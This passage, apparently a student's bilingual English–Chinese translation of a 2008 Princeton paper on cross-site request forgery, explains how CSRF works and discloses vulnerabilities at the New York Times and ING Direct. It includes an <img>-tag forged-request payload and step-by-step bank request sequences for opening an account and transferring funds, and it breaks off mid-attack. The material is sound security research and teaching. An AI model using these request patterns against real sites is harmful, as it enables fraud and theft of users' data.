># 题目
>## 《Cross-Site Request Forgeries: Exploitation and Prevention》

>## 《跨站请求伪造：剥削和预防》

> William Zeller⋆ and Edward W. Felten⋆† ⋆Department of Computer Science
⋆Center for Information Technology Policy †Woodrow Wilson School of Public and International Affairs Princeton University {wzeller,felten}@cs.princeton.edu

```
WilliamZeller⋆和EdwardW.Felten⋆†⋆计算机科学系
⋆信息技术政策中心†伍德罗威尔逊普林斯顿大学公共和国际事务学院{wzeller，felten} @ cs.princeton.edu

```
> Revision 10/15/2008: Noted that the New York Times has fixed the vulnerability described below. Also clarified that our server-side CSRF protection recommendations do not prevent the active network attacks described in [17].
The newest version of this paper can be found at
http://citp.princeton.edu/csrf/
```
修订版10/15/2008：注意到“纽约时报”已修复下述漏洞。 还澄清了我们的服务器端CSRF保护建议不能阻止[17]中描述的主动网络攻击。
本文的最新版本可以在以下位置找到
http://citp.princeton.edu/csrf/
```
> # Abstract

>Cross-Site Request Forgery (CSRF) attacks occur when a malicious web site causes a user’s web browser to per- form an unwanted action on a trusted site. These attacks have been called the “sleeping giant” of web-based vul- nerabilities, because many sites on the Internet fail to pro- tect against them and because they have been largely ig- nored by the web development and security communities. We present four serious CSRF vulnerabilities we have dis- covered on four major sites, including what we believe is the first published attack involving a financial institution. These vulnerabilities allow an attacker to transfer money out of user bank accounts, harvest user email addresses, violate user privacy and compromise user accounts. We recommend server-side changes (which we have imple- mented) that are able to completely protect a site from CSRF attacks. We also describe the features a server-side solution should have (the lack of which has caused CSRF protections to unnecessarily break typical web browsing behavior). Additionally, we have implemented a client- side browser plugin that can protect users from certain types of CSRF attacks even if a site has not taken steps to protect itself. We hope to raise the awareness of CSRF attacks while giving responsible web developers the tools to protect users from these attacks.

```bash
摘要

跨站点请求伪造（CSRF）攻击通常是指用户在web浏览器访问受信任的站点时执行了由恶意网站引起不需要的操作。这种攻击被称为基于web漏洞的“沉睡巨人”（Sleep giant），因为许多因特网的站点都难以实现防御抵制这种攻击，并且它们很大程度上被网络开发和安全社区忽略了。我们提出四种严重的CSRF漏洞，我们在四个主要网站上发现了这些漏洞，包括我们认为首次发布的涉及金融机构的攻击。这些漏洞导致攻击者可把财产资金转移出用户的银行账户，获取用户的邮件地址，侵犯窃取用户的隐私信息甚至危害用户账号。我们建议能够完全保护站点免受CSRF攻击的服务器端更改（我们已实施）。我们同样也描述了服务器端解决方案应具备的功能（缺少这些功能导致CSRF保护不必要地破坏典型的Web浏览行为）。另外，我们已经实现了一种客户端浏览器的插件，即使站点没有采取措施保护自己，也可以保护用户免受某些类型的CSRF攻击。我们希望引起对CSRF攻击的警觉，同时也希望为负责任的Web开发人员提供保护用户免受这些攻击的工具。
```
> # 1 Introduction
>Cross-Site Request Forgery1 (CSRF) attacks occur when a malicious web site causes a user’s web browser to perform an unwanted action on a trusted site. These attacks have been called the “sleeping giant” of web-based vulnerabili- ties [23], because many sites on the Internet fail to protect against them and because they have been largely ignored by the web development and security communities. CSRF attacks do not appear in the Web Security Threat Classifi- cation [12] and are rarely discussed in academic or techni- cal literature.2 CSRF attacks are simple to diagnose, sim- ple to exploit and simple to fix. They exist because web developers are uneducated about the cause and serious- ness of CSRF attacks. Web developers also may be under the mistaken impression that defenses against the better- known Cross-Site Scripting (XSS) problem also protect against CSRF attacks.

```bash
1 介绍

跨站点请求伪造（CSRF）攻击通常是指用户在web浏览器访问受信任的站点时执行了由恶意网站引起不需要的操作。这种攻击被称为基于web漏洞的“沉睡巨人”（Sleep giant），因为许多因特网的站点都难以实现防御抵制这种攻击，并且它们很大程度上被忽略了。CSRF攻击没有出现在Web Security Threat Classification[12]（Web安全威胁分类）中，同样也很少被在学术或者技术期刊报告中讨论，但却是易于利用易于修复。这些攻击存在因为通常网站开发人员都没有受过关于CFSR攻击的引起原因和严重性的专业知识培训。很多Web开发人员或许处于一种对于CSRF攻击的错误认知中，他们认为对于更著名的跨站点跟踪（XSS）的防御措施同样能够抵御CSRF攻击。

```

In Section 3, we present four serious CSRF vulnerabil- ities we have discovered on four major sites. These vul- nerabilities allow an attacker to transfer money out of user bank accounts, harvest user email addresses, violate user privacy and compromise user accounts.

```bash
在章节三，我们提出四种严重的CSRF漏洞，我们在四个主要网站上发现了这些漏洞，包括我们认为首次发布的涉及金融机构的攻击。这些漏洞导致攻击者可把财产资金转移出用户的银行账户，获取用户的邮件地址，侵犯窃取用户的隐私信息甚至危害用户账号。

```

In Section 4.1, we recommend server-side changes (which we have implemented) that are able to completely protect a site from CSRF attacks. These recommenda- tions have advantages over previously proposed solutions since they do not require server state and do not break typ- ical web browsing behavior. Additionally, we have imple- mented a client-side browser plugin that can protect users from certain types of CSRF attacks (Section 4.2). The server-side protections allow a site to completely protect itself from CSRF attacks, while the client-side protection allows users to take proactive steps to protect themselves from many types of CSRF attacks even if a site has not taken steps to protect itself. We hope to raise the aware- ness of CSRF attacks while giving responsible web devel- opers the tools to protect users from these attacks.

```
在章节4.1，我们建议能够完全保护站点免受CSRF攻击的服务器端更改（我们已实施）。这些推荐建议优于许多之前已经提出的解决方案，因为这些建议不需要服务器状态，也不会破坏典型的web网页浏览行为。另外，我们已经实现了一种客户端浏览器插件可以防止用户遭受某些类型的CSRF攻击（章节4.2）。服务器端保护允许站点完全保护自己免受CSRF攻击，而客户端保护允许用户采取主动措施来保护自己免受多种类型的CSRF攻击，即使站点没有采取措施保护自己。 我们希望提高对CSRF攻击的认识，同时为负责任的Web开发人员提供保护用户免受这些攻击的工具。
```

> # 2 Overview of CSRF
>Figures 1, 2 and 3 show how CSRF attacks generally work.
Below we describe CSRF attacks in more detail using a specific example.
```
2 CSFR概述
图1,2和3显示了CSRF攻击通常如何工作。
下面我们使用一个具体的例子更详细地描述CSRF攻击。
```

> ## 2.1 An Example
>Let’s consider a hypothetical example of a site vulnera- ble to a CSRF attack. This site is a web-based email site that allows users to send and receive email. The site uses implicit authentication (see Section 2.2) to authenticate its users. One page, http://example.com/compose. htm, contains an HTML form allowing a user to enter a recipient’s email address, subject, and message as well as a button that says, “Send Email.”

```
<form
     action="http://example.com/send_email.htm"
     method="GET">
     Recipient’s Email address:  <input
     type="text" name="to">
     Subject:  <input type="text" name="subject">
     Message:  <textarea name="msg"></textarea>
     <input type="submit" value="Send Email">
     </form>
```

```
2.1 引例
让我们考虑一个网站漏洞导致CSRF攻击的假设示例。此站点是基于Web的允许用户发送和接收电子邮件的电子邮件站点。这个网站使用隐藏认证方式认证其用户身份。http://example.com/compose. htm这个html页面，包含允许一个用户输入收信人的email地址、主题和信息的HTML表单和“SendEmail”按钮
<form
     action="http://example.com/send_email.htm"
     method="GET">
     Recipient’s Email address:  <input
     type="text" name="to">
     Subject:  <input type="text" name="subject">
     Message:  <textarea name="msg"></textarea>
     <input type="submit" value="Send Email">
     </form>
```

>When a user of example.com clicks “Send Email”, the data he entered will be sent to http://example.com/ send_email.htm as a GET request. Since a GET re- quest simply appends the form data to the URL, the user will be sent to the following URL (assuming he entered “bob@example.com” as the recipient, “hello” as the sub- ject, and “What’s the status of that proposal?” as the mes- sage):
http://example.com/send_email.htm?to=bob% 40example.com&subject=hello&msg=What%27s+the+ status+of+that+proposal%3F 3

```bash
当example.com的用户点击“Send Email”时，他输入的数据将会作为GET请求被发送到 http://example.com/ send_email.htm 。由于GET请求只是将表单数据附加到URL，因此用户将被发送到以下URL（假设该用户输入“bob@example.com”作为收件人，主题是“Hello”，内容是“那个提议的进展怎样？”）：http://example.com/send_email.htm?to=bob% 40example.com&subject=hello&msg=What%27s+the+ status+of+that+proposal%3F 3
```
The page send email.htm would take the data it re- ceived and send an email to the recipient from the user. Note that send email.htm simply takes data and per- forms an action with that data. It does not care where the request originated, only that the request was made. This means that if the user manually typed in the above URL into his browser, example.com would still send an email. For example, if the user typed the following three URLs into his browser, send email.htm would send three emails (one each to Bob, Alice, and Carol):
     `http://example.com/send_email.htm?to=bob%
     40example.com&subject=hi+Bob&msg=test
     http://example.com/send_email.htm?to=alice%
     40example.com&subject=hi+Alice&msg=test
     http://example.com/send_email.htm?to=carol%
     40example.com&subject=hi+Carol&msg=test`

```
页面发送email.htm将获取其收到的数据并从用户向收件人发送电子邮件。请注意，发送email.htm只需获取数据并对该数据执行操作。它并不会追踪请求来源，只关注请求信息本身的内容。这意味着如果用户在浏览器上手工输入以上URL，example.com依旧会发送一封邮件。例如，如果用户在浏览器中输入以下三个URL，发送email.htm将会发送三封电子邮件（一封发送给Bob,一封发送给Alice，一封发送给Carol）：
     `http://example.com/send_email.htm?to=bob%
     40example.com&subject=hi+Bob&msg=test
     http://example.com/send_email.htm?to=alice%
     40example.com&subject=hi+Alice&msg=test
     http://example.com/send_email.htm?to=carol%
     40example.com&subject=hi+Carol&msg=test`
```

A CSRF attack is possible here because send email.htm takes any data it receives and sends an email. It does not verify that the data originated from the form on compose.htm. Therefore, if an attacker can cause the user to send a request to send email.htm, that page will cause example.com to send an email on behalf of the user containing any data of the attacker’s choosing and the attacker will have successfully performed a CSRF attack.

```bash
在这种情况下CSRF攻击就有可能发生，因为发送eamil.htm包含收到它接受到的任何数据并且会发送一封电子邮件。它不会验证信息来自于compose.htm的表单，因此，如果攻击者能够引诱用户给发送email.htm发送一个请求，那么这个页面就会使example.com以用户身份发送一封包含所有攻击者选择数据的电子邮件，这样攻击者就会成功实现CSRF攻击。
```

To exploit this vulnerability, the attacker needs to force the user’s browser to send a request to send email.htm to perform some nefarious action. (We assume the user visits a site under the attacker’s control and the target site does not defend against CSRF attacks.) Specifically, the attacker needs to forge a cross-site request from his site to example.com. Unfortunately, HTML provides many ways to make such requests. The <img> tag, for example, will cause the browser to load whatever URI is set as the src attribute, even if that URI is not an image (because the browser can only tell the URI is an image after loading it). The attacker can create a page with the following code:
     `<img src="http://example.com/send_email.htm?
     to=mallory%40example.com&subject=Hi&msg=My+
     email+address+has+been+stolen">`
```bash
要利用这种脆弱性，攻击者需要强制用户浏览器给发送email.htm发送一个请求从而执行一些恶意操作。（我们假定用户浏览一个处于攻击者控制下的网站，并且目标网站并不能抵御CSFR攻击）具体而言，攻击者需要从他的站点向example.com伪造跨站点请求。不幸的是，HTML提供许多生成这种请求的方式。例如，<img>标记将导致浏览器加载任何URI作为src属性，即使该URI不是图像（因为浏览器只能在加载后告诉URI是图像）。 攻击者可以使用以下代码创建页面：
    <img src="http://example.com/send_email.htm?
     to=mallory%40example.com&subject=Hi&msg=My+
     email+address+has+been+stolen">

```

When the user visits that page, a request will be sent to send email.htm, which will then send an email to Mallory from the user. This example is nearly identical to an actual vulnerability we discovered on the New York Times website, which we describe in Section 3.1.

```
当用户访问该页面时，一个请求将会被发送到发送email.htm，然后发送 email.htm就会从用户端给Mallory发送一封邮件。这个例子与将要在章节3.1描述的我们在纽约时报网站上发现的实际漏洞相同。
```

CSRF attacks are successful when an attacker can cause a user’s browser to perform an unwanted action on another site. For this action to be successful, the user must be ca- pable of performing this action. CSRF attacks are typi- cally as powerful as a user, meaning any action the user can perform can also be performed by an attacker using a CSRF attack. Consequently, the more power a site gives a user, the more serious are the possible CSRF attacks.

```
当一个攻击者能够使用户浏览器执行链接到另外一个网站的无意行为时，CSRF攻击就成功实现了。要使此操作成功，用户必须能够执行此操作。CSRF攻击的危害性大小通常取决于一个用户的权限大小，这意味着用户能够执行的任何操作都可以被一个攻击者用一种CSRF攻击实现。因此，网站给用户的权限越高，遭受CSFR攻击的可能性越大。
```

CSRF attacks can be successful against nearly every site that uses implicit authentication (see Section 2.2) and does not explicitly protect itself from CSRF attacks.
The same-origin policy (see Appendix B) was designed to prevent an attacker from accessing data on a third-party site. This policy does not prevent requests from being sent, it only prevents an attack from reading the data re- turned from the third-party server. Since CSRF attacks are the result of the requests sent, the same-origin policy does not protect against CSRF attacks.

```
CSRF攻击能够被几乎任何使用隐式认证并且没有明确采取防御CSRF攻击的网站抵御（参考章节2.2）。同源策略（请参阅附录B）旨在防止攻击者访问第三方站点上的数据。这种策略没阻止发送请求，它仅仅阻止攻击者读取从第三方服务器返回的数据。因为CSRF攻击是请求发送的结果，所以同源策略并不能防御CSRF攻击。
```

![](/翻译大作业/images/pic1.png)

>Figure 1: Here, the Web Browser has established an authenticated session with the Trusted Site. Trusted Action should only be performed when the Web Browser makes the request over the authenicated session.

```
图1：此处，Web浏览器已与可信站点建立了经过身份验证的会话。 只有在Web浏览器通过身份验证的会话发出请求时，才应执行“受信任的操作”。
```

![](/翻译大作业/images/pic2.png)

>Figure 2: A valid request. The Web Browser attempts to perform a Trusted Action. The Trusted Site confirms that the Web Browser is authenticated and allows the action to be performed.

```
图2：有效请求。 Web浏览器尝试执行可信操作。 可信站点确认Web浏览器已通过身份验证，并允许执行操作。
```

![](/翻译大作业/images/pic3.png)

>Figure 3: A CSRF attack. The Attacking Site causes the browser to send a request to the Trusted Site. The Trusted Site sees a valid, authenticated request from the Web Browser and performs the Trusted Action. CSRF attacks are possible because web sites authenticate the web browser, not the user.
```
图3：CSRF攻击。 攻击站点使浏览器向可信站点发送请求。 可信站点从Web浏览器中查看有效的，经过身份验证的请求，并执行可信操作。 CSRF攻击是可能的，因为网站对Web浏览器进行身份验证，而不是用户。
```
>## 2.2 Authentication and CSRF
>CSRF attacks often exploit the authentication mecha- nisms of targeted sites. The root of the problem is that Web authentication normally assures a site that a request came from a certain user’s browser; but it does not ensure that the user actually requested or authorized the request.
For example, suppose that Alice visits a target site T . T gives Alice’s browser a cookie containing a pseudoran- dom session identifier sid, to track her session. Alice is asked to log in to the site, and upon entry of her valid user- name and password, the site records the fact that Alice is logged in to session sid. When Alice sends a request to T , her browser automatically sends the session cookie con- taining sid. T then uses its record to identify the session as coming from Alice.

```
2.2 认证和CSRF
CSRF攻击通常利用目标网站的身份验证机制。问题的根源是Web认证通常只确认某个网站请求来自于特定用户的浏览器，却不会确认用户实际请求是什么或者认证请求。
例如，假设Alice访问一个目标站点T。网站T为了跟踪用户Alice的会话，给Alice的浏览器一个包含一个伪随机检查标识符sid的cookie。Alice被要求登录该站点，并在输入有效的用户名和密码后，该站点把Alice已经登录的状态记录到会话sid标识符。当Alice给网站T发送请求，她的浏览器会自动发送包含sid标识符的会话cookie，然后T使用其记录将会话标识为来自Alice。
```

Now suppose Alice visits a malicious site M. Content supplied by M contains Javascript code or an image tag that causes Alice’s browser to send an HTTP request to T . Because the request is going to T , Alice’s browser “help fully” appends the session cookie sid to the request. On seeing the request, T infers from the cookie’s presence that the request came from Alice, so T performs the re- quested operation on Alice’s account. This is a successful CSRF attack.

```
现在假想Alice访问一个恶意站点M。由M提供的内容包含Javascript代码或图像标记，导致Alice的浏览器向T发送HTTP请求。 因为请求将要发送给站点T，Alice的浏览器“完全帮助”将会话cookie中的标识符sid附加在请求中。网站T一旦看到请求，就会通过cookie包含存在的信息来确认请求来自于用户ALice，因此网站T才能在Alice的账户执行被请求的操作。这就是一个成功的CSRF攻击例子。
```
Most of the other Web authentication mechanisms suf- fer from the same problem. For example, the HTTP BasicAuth mechanism [22] would have Alice tell her browser her username and password for T’s site, and then the browser would “helpfully” attach the username and pass- word to future requests sent to T . Alternatively, T might use client-side SSL certificates, but the same problem would result because the browser would “helpfully” use the certificate to carry out requests to T ’s site. Similarly, if T authenticates Alice by her IP address, CSRF attacks would be possible.
```
其他Web网站的大部分认证机制会存在同样的问题。例如，HTTP请求基本认证机制[22]会要求用户Alice告知她的浏览器登录网站T的用户名和密码，然后浏览器会“帮助系统“将用户名和密码附加在未来发送给站点T的请求中。或者（作为一种选择），网站T会使用用户端SSL认证证书，但是相同的问题将会产生，因为浏览器会“帮助”使用证书去执行发送给站点T的请求，同时，如果站点T通过她的IP地址认证Alice，CSRF攻击就可能发生。
```
In general, whenever authentication happens implicitly—because of which site a request is being sent to and which browser it is coming from—there is a danger of CSRF attacks. In principle, this danger could be eliminated by requiring the user to take an explicit, unspoofable action (such as re-entering a username and password) for each request sent to a site, but in practice this would cause major usability problems. The most standard and widely used authentication mechanisms fail to prevent CSRF attacks, so a practical solution must be sought elsewhere.

```
通常情况下，无论请求被发送的目标网站和请求来自的存在CSRF攻击的浏览器引起的隐藏认证何时发生，都有发生CSRF攻击的危险。原则上，这种危险可以通过要求用户对于每一个发送到网站的请求采用明确的，不会被嗅探的行为避免，但是实践中这将会引起主要可使性问题。最标准的和最为广泛使用的认证机制未能抵御CSRF攻击，因此必须在其他地方寻求切实可行的解决方案。

```
>## 2.3 CSRF Attack Vectors
>For an attack to be successful, the user must be logged-in to the target site and must visit the attacker’s site or a site over which the attacker has partial control.
If a server contains CSRF vulnerabilities and also ac-cepts GET requests (as in the above example), CSRF at- tacks are possible without the use of JavaScript (for exam- ple, a simple <img> tag can be used). If the server only accepts POST requests, JavaScript is required to automat- ically send a POST request from the attacker’s site to the target site.
```
2.3 CSRF攻击向量

要使攻击成功，用户必须登录到目标站点，并且必须访问攻击者的站点或攻击者可以部分控制的站点。
如果服务器包含CSRF漏洞并且还接受GET请求（如上例所示），则可以在不使用JavaScript的情况下进行CSRF攻击（例如，可以使用简单的<img>标记）。如果服务器只接受POST请求，则需要JavaScript自动从攻击者的站点向目标站点发送POST请求。

```
>## 2.4 CSRF vs. XSS
>Recently much attention has been paid to Cross-Site Scripting (XSS) [20] vulnerabilities. A XSS attack oc-curs when an attacker injects malicious code (typically JavaScript) into a site for the purpose of targeting other users of the site. For example, a site might allow users to post comments. These comments are submitted by a user, stored in a database and displayed to all future users of the site. If an attacker is able to enter malicious JavaScript as part of a comment, the JavaScript would be embedded on any page containing the comment. When a user visits the site, the attacker’s JavaScript would be executed with all the privileges of the target site. Malicious JavaScript em- bedded in a target site would be able to send and receive requests from any page on the site and access cookies set by that site. Protection from XSS attacks requires sites to carefully filter any user input to ensure that no malicious code is injected.
CSRF and XSS attacks differ in that XSS attacks re- quire JavaScript, while CSRF attacks do not. XSS attacks require that sites accept malicious code, while with CSRF attacks malicious code is located on third-party sites. Fil- tering user input will prevent malicious code from running on a particular site, but it will not prevent malicious code from running on third-party sites. Since malicious code can run on third-party sites, protection from XSS attacks does not protect a site from CSRF attacks. If a site is vul- nerable to XSS attacks, then it is vulnerable to CSRF at- tacks. If a site is completely protected from XSS attacks, it is most likely still vulnerable to CSRF attacks.

```
2.4 CSRF与XSS

最近，跨站点脚本（XSS）[20]漏洞受到了很多关注。当攻击者以攻击站点的其他用户为目标时将恶意代码（通常是JavaScript）注入该站点，就会发生XSS攻击。例如，网站可能允许用户发表评论。这些注释被用户提交，存储在数据库中并显示给站点的所有未来用户。如果攻击者能够在评论中插入恶意JavaScript，则JavaScript将嵌入到包含评论的任何页面中。当用户访问该站点时，攻击者的JavaScript将以目标站点的所有权限执行。嵌入目标站点的恶意JavaScript将能够从站点上的任何页面发送和接收请求，并访问该站点设置的cookie。防止XSS攻击需要站点仔细过滤任何用户输入，以确保不会注入恶意代码。
CSRF和XSS攻击的不同之处在于XSS攻击需要JavaScript，而CSRF攻击则不需要。 XSS攻击要求站点接受恶意代码，而使用CSRF攻击时，恶意代码位于第三方站点上。过滤用户输入将阻止恶意代码在特定站点上运行，但不会阻止恶意代码在第三方站点上运行。由于恶意代码可以在第三方站点上运行，因此防止XSS攻击不能保护站点免受CSRF攻击。如果一个站点易受XSS攻击，那么它很容易受到CSRF的攻击。如果站点完全受到XSS攻击的保护，则很可能仍然容易受到CSRF攻击。
```

># 3 CSRF Vulnerabilities
>In this section we describe four vulnerabilities we dis- covered. These attacks were found by surveying a list of about ten popular websites. Many of the sites we analyzed either had CSRF vulnerabilities or a history of vulnerabil- ities (e.g., a web search would show a report of a CSRF vulnerability that has since been fixed). The fact that so many sites are vulnerable to CSRF attacks until a third- party discloses the problems shows that many site admin- istrators are uneducated about the risks and existence of CSRF vulnerabilities.

```
3 CSRF漏洞

在这一章节我们描述我们已经发现的四种漏斗。这些攻击是在调查十大受欢迎网站时发现的。我们分析的许多这些网站中都有过CSRF漏洞或者漏洞历史（例如，一份网络搜索会显示已经被修复的CSRF漏洞报告）事实上，在第三方披露问题之前，如此多的网站容易遭受CSRF攻击，这表明许多网站管理员缺失CSRF漏洞的风险和存在的专业知识。
```
We believe ING Direct, Metafilter and YouTube, and the New York Times have corrected the vulnerabilities we describe below. All four sites appear to have fixed the problem using methods similar to what we propose in Section 4.1.
```
我们相信ING Direct、Metafilter 、YouTube, 和 纽约时报已将修补了我们下面描述的这些漏洞。所有这四个站点似乎都已经运用类似于我们在章节4.1提出的方法修复了这个问题。
```
>## 3.1 The New York Times (nytimes.com)
>The New York Times website is the “the #1 reaching newspaper site on the Web” [10].
We discovered a CSRF vulnerability in NYTimes.com that makes user email addresses available to an attacker. If you are a NYTimes.com member, abitrary sites can use this attack to determine your email address and use it to send spam or to identify you.
```
3.1 纽约时报

“纽约时报”网站是“网络上排名第一的报纸网站”[10]。我们在NYTimes.com发现了一种能够使用户email地址被攻击者获取的CSRF漏洞，如果你是在NYTimes.co的一个成员，任意的站点都可以利用这种攻击去确定你的email地址并且利用它去发送一个
垃圾邮件或者去鉴定你的身份。
```
This attack takes advantage of NYTimes.com’s “Email This” feature. “Email This” is a tool that allows a user to send a link to a NYTimes.com article by specifying a recipient’s email address and optionally, a personal mes- sage. The recipient receives an email that looks something like this:
This page was sent to you by: [USER’S EMAIL ADDRESS]
     Message from sender:
     Thought you’d be interested in this.
     NATIONAL DESK
     Researchers Find Way to Steal Encrypted Data
     By JOHN MARKOFF
     A computer security research group has
     developed a way to steal encrypted
     information from computer hard disks.
```
这种攻击充分利用了 NYTimes.com’s “Email This”特征。“Email This”是一个工具，它允许用户通过指定接收者email地址或可选择的个人信息来给一篇NYTimes.com的文章发送一个链接。接收者收到一封如下所示的邮件：
本页面由以下人员发送给您：[用户的电子邮件地址]
      发件人留言：
      以为你会对此感兴趣。
      国家办公桌
      研究人员找到窃取加密数据的方法
      作者：JOHN MARKOFF
      一个计算机安全研究小组
      开发了一种窃取加密的方法
      来自计算机硬盘的信息。
```
To exploit this vulnerability, an attacker causes a logged-in user’s browser to send a request to the NY- Times.com “Email This” page. The page accepting “Email This” requests does not protect against CSRF at-tacks, so the user’s browser will cause a request to be sent to NYTimes.com that will trigger it to send an email to an address of the attacker’s choosing. If the attacker changes the recipient email address to his own email address, he will receive an email from NYTimes.com containing the user’s email address.
Exploiting this vulnerability is remarkably simple. Each article on NYTimes.com contains a link to the “Email This” page, which contains a form where the user enters a recipient’s email address. This form also contains hidden variables which are unique for each article. Here is an example form:

```
为了利用这种漏洞，攻击者会引诱登录用户的浏览器向NY- Times.com 的“Email This” 页面发送一个请求。接受“Email This”请求的页面不能抵御CSRF攻击，因此用户的浏览器将会引起向NYTimes.com发送请求，该请求会触发这个页面向攻击人选择的地址发送一封邮件。如果攻击者把电子邮件接受者的地址替换为他自己的email地址，他将接收一封来自NYTimes.com 的包含用户email地址的电子邮件。利用这种漏洞非常简单，NYTimes.com的每篇文章都包含一个链接到“Email This” 页面的链接，其中包含一个用户输入接收者email地址的表单。这个表单同样包含对每篇文章的唯一隐藏变量。以下是一个示例表单。
```
```
<form action="http://www.nytimes.com/mem/emailthis.html" method="POST" enctype="application/x-www-form-urlencoded"> <input type="checkbox" id="copytoself" name="copytoself" value="Y">
<input id="recipients" name="recipients" type="text" maxlength="1320" value="">
<input type="hidden" name="state" value="1"> <textarea id="message" name="personalnote" maxlength="512"></textarea>
<input type="hidden" name="type" value="1">
<input type="hidden" name="url"
value="[...]">
<input type="hidden" name="title" value="[...]">
<input type="hidden" name="description" value="[...]">
... </form>
```
>Since NYTimes.com does not distinguish between GET and POST requests, the attacker can transform this form into a GET request that can later be used in an <img> tag. Transforming a form into a GET request involves appending each parameter to the URL’s query string (in the form NAME=VALUE, separated by an ampersand).

```
因为NYTimes.com不能区分GET请求和POST请求，攻击者可以将这个表单转换为一个GET请求，这个请求之后会被应用在<img>标签中。把表单转换为一个GET请求中涉及把每个参数附加到URL的查询字符串中（格式：NAME=VALUE，用符号&分隔）
```
Once the attacker has constructed the URL, he can set it to be the SRC attribute of an <img> tag. If a logged- in user of NYTimes.com visits any page containing this <img> tag, the browser will load the “Email This” page with the attacker’s parameters, causing NYTimes.com to send an email to the attacker containing the user’s email address. The attacker could store this email address for later abuse (e.g., for spamming purposes) or use the email address to identify visitors to his own site. This could lead to serious privacy consequences, such as allowing operators of controversial sites (e.g., political or illicit) to iden-tify their users.
We verified this attack in Firefox 2.0.0.6, Opera 9.23 and Safari 3.0.3 (522.15.5). It does not work in Internet Explorer due to reasons described in Appendix A. We notified the New York Times of this vulnerability in Septem- ber 2007. This was fixed by Oct 1, 2008.
```
一旦攻击者重构了URL，他就能将它设置为<img>标签的SRC属性。如果NYTimes.com 的登录用户访问包含该<img>标签的任何页面，浏览器就会加载携带攻击者参数的“Email This”页面，致使NYTimes.com向攻击者发送一封包含用户的email地址的邮件。攻击者可以把用户的email地址存储起来以便之后滥用（例如，发送垃圾邮件）或者使用email地址来识别它自己站点的访问者。这会引起严重的隐私问题，比如允许有争议的网站（例如，政治或非法）的运营商识别其用户。我们在Firefox 2.0.0.6, Opera 9.23和Safari 3.0.3 (522.15.5)测试这种攻击。由于在附录A描述的原因在Internet
 Explorer中并不生效。我们在2007年9月向纽约时报通报了此漏洞。到2008年10月1日这个漏洞已经被修复。
```
>## 3.2 ING Direct (ingdirect.com)
>“ING DIRECT is the fourth largest savings bank in America with more than $62 billion in assets, delivering superior savings and mort-gage services to over 4.1 million customers.” [15]
We discovered CSRF vulnerabilities in ING’s site that allowed an attacker to open additional accounts on behalf of a user and transfer funds from a user’s account to the attacker’s account. As we discuss in Section 2.2, ING’s use of SSL does not prevent this attack. We believe this is the first published CSRF attack involving a financial institution.
Since ING did not explicitly protect against CSRF at- tacks, transferring funds from a user’s accounts was as simple as mimicking the steps a user would take when transferring funds. These steps consist of the following actions:
```
3.2 ING Direct (ingdirect.com）

“ING Direct是美国第四大储蓄银行，拥有超过620亿资产，为超过410万用户提供卓越储蓄和抵押服务 ”[15]
我们在ING网站发现CSRF漏洞，这种漏洞允许攻击者代表用户开设其他账户，并且从用户账户转移资金到攻击者账户。正如我们在章节2.2讨论的那样，ING使用SSL并不能抵御这种攻击。我们认为这是第一个被公布的涉及金融机构的CSRF攻击。
因为ING不能明确抵御这种CSRF攻击，所以从用户账户转移资产和模仿用户在转移资产时所采取的步骤一样简单。这些步骤包含下列操作。

```
>1. The attacker creates a checking account on behalf of the user.4
>(a) The attacker causes the user’s browser to visit ING’s “Open New Account” page:
• A GET request to https://secure. ingdirect.com/myaccount/ INGDirect.html?command= goToModifyPersonalPayee&Mode= Add&from=displayEmailMoney

```
攻击者代表用户创建一个支票账户
（a）攻击者使用户浏览器访问ING的“开设新账户”页面：
      • 一个GET请求发送到 https://secure. ingdirect.com/myaccount/ INGDirect.html?command= gotoOpenOCA
```
>(b) The attacker causes the user’s browser to enter the attacker’s information:

>• A POST request to https://secure. ingdirect.com/myaccount/ INGDirect.html with the parameters:

```
   command=ocaOpenInitial&YES, I
    WANT TO CONTINUE..x=44&YES, I
    WANT TO CONTINUE..y=25
```
```
攻击者使用户浏览器输入攻击者的信息：

一个POST请求发送到 https://secure. ingdirect.com/myaccount/ INGDirect.html 带有以下参数:
     command=ocaOpenInitial&YES, I
     WANT TO CONTINUE..x=44&YES, I
     WANT TO CONTINUE..y=25
```
> (c) The attacker choose an arbitery amount on money to initially transfer from the user’s sav- ings account to the new, fraudulent account:

>  • A POST request to https://secure.
ingdirect.com/myaccount/ INGDirect.html with the parameters:

```
command=ocaValidateFunding&PRIMARY CARD=true&JOINTCARD=true&Account Nickname=[ACCOUNT NAME]&FROMACCT= 0&TAMT=[INITIAL AMOUNT]&YES, I WANT TO CONTINUE..x=44&YES, I
                 WANT TO
                 CONTINUE..y=25&XTYPE=4000USD
                 &XBCRCD=USD
. . . where [ACCOUNT NAME] is the name of the account that the user will see and [INITIAL AMOUNT] is the amount of money that will be transferred to the new account when it is opened. The account name can be any string and does not need to be known by the attacker before hand–it is simply a nickname that will be used for the new account.
```
```
(c)攻击者选择资金的仲裁金额，最初从用户的储蓄账户转移到新的欺诈账户：
• 一个POST请求发送到 https://secure.
ingdirect.com/myaccount/ INGDirect.html带有以下参数

    
                 command=ocaValidateFunding&PRIMARY CARD=true&JOINTCARD=true&Account Nickname=[ACCOUNT NAME]&FROMACCT= 0&TAMT=[INITIAL AMOUNT]&YES, I WANT TO CONTINUE..x=44&YES, I
                 WANT TO
                 CONTINUE..y=25&XTYPE=4000USD
                 &XBCRCD=USD

                ……其中[帐户名]是用户将看到的帐户的名称，[INITIAL AMOUNT]是打开时将转移到新帐户的金额。 帐户名称可以是任何字符串，攻击者无需事先知道它 - 它只是一个将用于新帐户的昵称。

```

>(d) The attacker causes the user’s browser to click the final “Open Account” button, causing ING to open a new checking account on behalf of the user:
• A POST request to https://secure. ingdirect.com/myaccount/ INGDirect.html with the parame- ters:

```
                 command=ocaOpenAccount&Agree   ElectronicDisclosure=yes&AgreeTerms
                 Conditions=yes&YES, I WANT TO
                 CONTINUE..x=44&YES, I WANT TO
                 CONTINUE..y=25&YES, I WANT TO
                 CONTINUE.=Submit
```


```
(d)攻击者使用户浏览器点击最后的“开通账户”按钮，使ING代表用户开设一个新的支票：
    • 一个POST请求发送到https://secure. ingdirect.com/myaccount/ INGDirect.html带有以下参数：
                 command=ocaOpenAccount&Agree
                 ElectronicDisclosure=yes&AgreeTerms
                 Conditions=yes&YES, I WANT TO
                 CONTINUE..x=44&YES, I WANT TO
                 CONTINUE..y=25&YES, I WANT TO
                 CONTINUE.=Submit


```
>2. The attacker adds himself as a payee to the user’s account.
(a) The attacker causes the user’s browser to visit ING’s “Add Person” page:

